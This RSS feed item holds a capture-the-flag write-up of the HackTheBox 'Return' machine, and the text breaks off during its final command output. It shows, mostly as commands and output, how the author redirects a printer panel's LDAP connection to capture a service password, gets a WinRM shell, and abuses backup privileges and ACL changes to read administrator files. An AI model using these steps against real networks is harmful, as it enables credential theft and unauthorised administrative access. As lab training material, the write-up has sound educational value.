<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>PrintNightmare on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/printnightmare/</link>
    <description>Recent content in PrintNightmare on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sun, 24 Oct 2021 09:12:47 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/printnightmare/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Return</title>
      <link>https://fahmifj.github.io/hackthebox/return/</link>
      <pubDate>Sun, 24 Oct 2021 09:12:47 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/return/</guid>
      <description>Return is another machine listed in the HTB printer exploitation track. This machine hosts a web panel for managing a network printer, and this panel stores a user credentials with a masked password. By changing the printer&amp;rsquo;s address to my IP, I can obtain the unmasked password. Enumerating the user&amp;rsquo;s info reveals that it&amp;rsquo;s member of two privileged groups which can then be abused to gain administrative access in multiple ways.</description>
      <content:encoded><![CDATA[<p>Return is another machine listed in the HTB printer exploitation track. This machine hosts a web panel for managing a network printer, and this panel stores a user credentials with a masked password. By changing the printer&rsquo;s address to my IP, I can obtain the unmasked password. Enumerating the user&rsquo;s info reveals that it&rsquo;s member of two privileged groups which can then be abused to gain administrative access in multiple ways.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Abusing network printer</li>
<li>Abusing Windows Server Operators group</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Netcat</li>
<li><a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1">ACL-FullControl.ps1</a></li>
<li><a href="https://github.com/fahmifj/AAD-scripts/blob/main/Acl-RevokeFullControl.ps1">ACL-RevokeFullControl.ps1</a></li>
<li><a href="https://github.com/calebstewart/CVE-2021-1675">PrintNightmare LPE</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full TCP scan discovers a bunch of ports open. Seeing port 53, 88, and 389, I can safely assume this is Active Directory system.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ fscan 10.10.11.108 <span class="k">return</span>
</span></span><span class="line"><span class="cl">nmap -p- 10.10.11.108 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
</span></span><span class="line"><span class="cl">nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49673,49676,49688,59797 -sC -sV -oA nmap/all-tcp-ports-return 10.10.11.108
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-15 18:48 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.108
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.066s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
</span></span><span class="line"><span class="cl">80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: HTB Printer Admin Panel
</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2021-10-15 23:14:10Z<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: <span class="k">return</span>.local0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped
</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: <span class="k">return</span>.local0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped
</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span class="line"><span class="cl">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49665/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49666/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49669/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">49671/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49673/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49676/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49688/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">59797/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">Service Info: Host: PRINTER<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 25m20s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-10-15T23:15:10
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 72.44 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>On SMB, anonymous login is allowed, but there is no share available.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.11.108/
</span></span><span class="line"><span class="cl">Anonymous login successful
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
</span></span><span class="line"><span class="cl">        ---------       ----      -------
</span></span><span class="line"><span class="cl">SMB1 disabled -- no workgroup available
</span></span></code></pre></div><p>I tried to enumerate the domain users, but got access denied.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ rpcclient -U <span class="s1">&#39;%&#39;</span> 10.10.11.108                                                     
</span></span><span class="line"><span class="cl">rpcclient $&gt; srvinfo
</span></span><span class="line"><span class="cl">Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
</span></span><span class="line"><span class="cl">rpcclient $&gt; enumdomusers 
</span></span><span class="line"><span class="cl">result was NT_STATUS_ACCESS_DENIED
</span></span></code></pre></div><h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>Without creds, there is no hope here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.11.108 -b <span class="s2">&#34;dc=return,dc=local&#34;</span>
</span></span><span class="line"><span class="cl">Operations error <span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">Additional information: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this operation a successful <span class="nb">bind</span> must be completed on the connection., data 0, v4563
</span></span></code></pre></div><h3 id="tcp-80---printer-panel">TCP 80 - Printer Panel</h3>
<p>A printer admin panel for managing printer is shown on port 80.</p>
<p><div class="img-container"><img src="imgs/image-20211017015705468.png" alt="image-20211017015705468"  /></div>
</p>
<p>Under the settings menu, I can see the printer&rsquo;s configuration, which reveals a username and a masked password. This password can&rsquo;t be unmasked by modifying the HTML attribute.</p>
<p><div class="img-container"><img src="imgs/image-20211017015826808.png" alt="image-20211017015826808"  /></div>
</p>
<p>Clicking on the update button sends out a POST request with parameter <code>ip</code> to Return&rsquo;s IP.</p>
<p><div class="img-container"><img src="imgs/image-20211017023404252.png" alt="image-20211017023404252"  /></div>
</p>
<p>The key takeaway from this is that I was the one who triggered that request.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-svc-printer">Shell as svc-printer</h3>
<h4 id="capturing-password">Capturing Password</h4>
<p>From the previous enumeration on printer panel, what if I change the server address to my IP and setup a nc listener?.</p>
<p><div class="img-container"><img src="imgs/image-20211017022203702.png" alt="image-20211017022203702"  /></div>
</p>
<p>The answer is the password pops up on my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">389</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">389</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.11<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.108<span class="o">]</span> <span class="m">50904</span>
</span></span><span class="line"><span class="cl">0*<span class="sb">`</span>%return<span class="se">\s</span>vc-printer�
</span></span><span class="line"><span class="cl">                       1edFg43012!!
</span></span></code></pre></div><p>CrackMapExec shows that <code>return\svc-printer:1edFg43012!!</code> is a valid credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ crackmapexec smb 10.10.11.108 -u <span class="s1">&#39;svc-printer&#39;</span> -p <span class="s1">&#39;1edFg43012!!&#39;</span>
</span></span><span class="line"><span class="cl">SMB         10.10.11.108    <span class="m">445</span>    PRINTER          <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         10.10.11.108    <span class="m">445</span>    PRINTER          <span class="o">[</span>+<span class="o">]</span> <span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!! 
</span></span><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ crackmapexec winrm 10.10.11.108 -u <span class="s1">&#39;svc-printer&#39;</span> -p <span class="s1">&#39;1edFg43012!!&#39;</span> 	
</span></span><span class="line"><span class="cl">WINRM       10.10.11.108    <span class="m">5985</span>   PRINTER          <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> <span class="o">(</span>name:PRINTER<span class="o">)</span> <span class="o">(</span>domain:return.local<span class="o">)</span>
</span></span><span class="line"><span class="cl">WINRM       10.10.11.108    <span class="m">5985</span>   PRINTER          <span class="o">[</span>*<span class="o">]</span> http://10.10.11.108:5985/wsman
</span></span><span class="line"><span class="cl">WINRM       10.10.11.108    <span class="m">5985</span>   PRINTER          <span class="o">[</span>+<span class="o">]</span> <span class="k">return</span>.local<span class="se">\s</span>vc-printer:1edFg43012!! <span class="o">(</span>Pwn3d!<span class="o">)</span>
</span></span></code></pre></div><h4 id="winrm---svc-printer">WinRM - svc-printer</h4>
<p>I can login via WinRM and grab the flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «return» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.11.108 -u <span class="s1">&#39;svc-printer&#39;</span> -p<span class="s1">&#39;1edFg43012!!&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; 
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; gci
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                -------------         ------ ----
</span></span><span class="line"><span class="cl">-ar---       10/14/2021  10:33 PM             <span class="m">34</span> user.txt
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; gc user.txt 
</span></span><span class="line"><span class="cl">48ba9...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="administrative-access">Administrative Access</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Checking user&rsquo;s privileges with <code>whoami</code> reveals that <code>svc-printer</code> is a member of Server Operators and Print Operators. There are also some access tokens that can be abused.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; whoami /all
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">USER INFORMATION
</span></span><span class="line"><span class="cl">----------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User Name          <span class="nv">SID</span>
</span></span><span class="line"><span class="cl"><span class="o">==================</span> <span class="o">=============================================</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span><span class="se">\s</span>vc-printer S-1-5-21-3750359090-2939318659-876128439-1103
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">GROUP INFORMATION
</span></span><span class="line"><span class="cl">-----------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Group Name                                 Type             SID          <span class="nv">Attributes</span>
</span></span><span class="line"><span class="cl"><span class="o">==========================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">==================================================</span>
</span></span><span class="line"><span class="cl">Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\S</span>erver Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\P</span>rint Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\R</span>emote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\U</span>sers                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\P</span>re-Windows <span class="m">2000</span> Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\N</span>ETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\A</span>uthenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\T</span>his Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\N</span>TLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">Mandatory Label<span class="se">\H</span>igh Mandatory Level       Label            S-1-16-12288
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
</span></span><span class="line"><span class="cl">----------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Privilege Name                Description                         <span class="nv">State</span>
</span></span><span class="line"><span class="cl"><span class="o">=============================</span> <span class="o">===================================</span> <span class="o">=======</span>
</span></span><span class="line"><span class="cl">SeMachineAccountPrivilege     Add workstations to domain          Enabled
</span></span><span class="line"><span class="cl">SeLoadDriverPrivilege         Load and unload device drivers      Enabled
</span></span><span class="line"><span class="cl">SeSystemtimePrivilege         Change the system <span class="nb">time</span>              Enabled
</span></span><span class="line"><span class="cl">SeBackupPrivilege             Back up files and directories       Enabled
</span></span><span class="line"><span class="cl">SeRestorePrivilege            Restore files and directories       Enabled
</span></span><span class="line"><span class="cl">SeShutdownPrivilege           Shut down the system                Enabled
</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
</span></span><span class="line"><span class="cl">SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set</span>      Enabled
</span></span><span class="line"><span class="cl">SeTimeZonePrivilege           Change the <span class="nb">time</span> zone                Enabled
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">USER CLAIMS INFORMATION
</span></span><span class="line"><span class="cl">-----------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User claims unknown.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Kerberos support <span class="k">for</span> Dynamic Access Control on this device has been disabled.
</span></span></code></pre></div><p>According to this <a href="https://ss64.com/nt/syntax-security_groups.html">site</a>, <strong>Server Operators</strong> is:</p>
<blockquote>
<p>A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.</p>
</blockquote>
<p>I can say that <strong>Server Operators</strong> is the ultimate version of <strong>Backup Operators</strong>.</p>
<p>As for Print Operators, I&rsquo;ll remember from HTB: Fuse that it can be exploited by loading a malicious driver using <code>SeLoadDriverPrivilege</code>. I don&rsquo;t demo it here, so see <a href="https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#priv-svc-print--system">this awesome post</a> by 0xdf instead.</p>
<p>Further enumeration reveals that Print Spooler is running ( ͡° ͜ʖ ͡°).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>esktop&gt; Get-Service -Name Spooler
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Status   Name               DisplayName
</span></span><span class="line"><span class="cl">------   ----               -----------
</span></span><span class="line"><span class="cl">Running  Spooler            Print Spooler
</span></span></code></pre></div><h4 id="diskshadow-failed">DiskShadow (failed)</h4>
<p>The back up and restore files involve two access tokens: <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>. These tokens were previously abused to dump AD database (NTDS.d) in <a href="https://fahmifj.github.io/hackthebox/blackfield/#shell-as-administrator">HTB: Blackfield</a>.</p>
<p>I tried to reproduce the attack here, but I got the following results.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; diskshadow /s script.txt
</span></span><span class="line"><span class="cl">Microsoft DiskShadow version 1.0
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2013</span> Microsoft Corporation
</span></span><span class="line"><span class="cl">On computer:  PRINTER,  10/16/2021 1:24:40 PM
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-&gt; <span class="nb">set</span> context persistent nowriters
</span></span><span class="line"><span class="cl">-&gt; add volume c: <span class="nb">alias</span> iamf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">COM call <span class="s2">&#34;(*vssObject)-&gt;InitializeForBackup&#34;</span> failed.
</span></span></code></pre></div><p>The intended way, according to the official writeup, is to abuse the <code>Server Operators</code> ability to start/stop/modify services, but I&rsquo;ll put that aside.</p>
<h4 id="acl-full-access">ACL Full Access</h4>
<p>There is another way that still involves the <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>. It&rsquo;s to modify ACL and grant myself full access to the file/folder I specified using <a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1">this PowerShell script</a>. In the following, I use that script to own the entire admin&rsquo;s desktop folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt;Acl-FullControl -user <span class="k">return</span><span class="se">\s</span>vc-printer -path c:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current permissions:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">Owner  : BUILTIN<span class="se">\A</span>dministrators
</span></span><span class="line"><span class="cl">Group  : RETURN<span class="se">\D</span>omain Users
</span></span><span class="line"><span class="cl">Access : NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
</span></span><span class="line"><span class="cl">         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
</span></span><span class="line"><span class="cl">         RETURN<span class="se">\A</span>dministrator Allow  FullControl
</span></span><span class="line"><span class="cl">Audit  :
</span></span><span class="line"><span class="cl">Sddl   : O:BAG:DUD:<span class="o">(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Changing permissions to c:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Acls changed successfully.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">Owner  : BUILTIN<span class="se">\A</span>dministrators
</span></span><span class="line"><span class="cl">Group  : RETURN<span class="se">\D</span>omain Users
</span></span><span class="line"><span class="cl">Access : RETURN<span class="se">\s</span>vc-printer Allow  FullControl
</span></span><span class="line"><span class="cl">         NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
</span></span><span class="line"><span class="cl">         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
</span></span><span class="line"><span class="cl">         RETURN<span class="se">\A</span>dministrator Allow  FullControl
</span></span><span class="line"><span class="cl">Audit  :
</span></span><span class="line"><span class="cl">Sddl   : O:BAG:DUD:AI<span class="o">(</span>A<span class="p">;</span>OICI<span class="p">;</span>FA<span class="p">;;;</span>S-1-5-21-3750359090-2939318659-876128439-1103<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
</span></span></code></pre></div><p>Now I can read the flag</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nb">type</span> <span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
</span></span><span class="line"><span class="cl">9f8dd...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>I also made the <a href="https://github.com/fahmifj/AAD-scripts/blob/main/Acl-RevokeFullControl.ps1">anti script</a> to revert what I did on the admin&rsquo;s desktop folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Acl-RevokeFullControl -User <span class="k">return</span><span class="se">\s</span>vc-printer -Path C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current permissions:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">Owner  : BUILTIN<span class="se">\A</span>dministrators
</span></span><span class="line"><span class="cl">Group  : RETURN<span class="se">\D</span>omain Users
</span></span><span class="line"><span class="cl">Access : RETURN<span class="se">\s</span>vc-printer Allow  FullControl
</span></span><span class="line"><span class="cl">         NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
</span></span><span class="line"><span class="cl">         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
</span></span><span class="line"><span class="cl">         RETURN<span class="se">\A</span>dministrator Allow  FullControl
</span></span><span class="line"><span class="cl">Audit  :
</span></span><span class="line"><span class="cl">Sddl   : O:BAG:DUD:AI<span class="o">(</span>A<span class="p">;</span>OICI<span class="p">;</span>FA<span class="p">;;;</span>S-1-5-21-3750359090-2939318659-876128439-1103<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
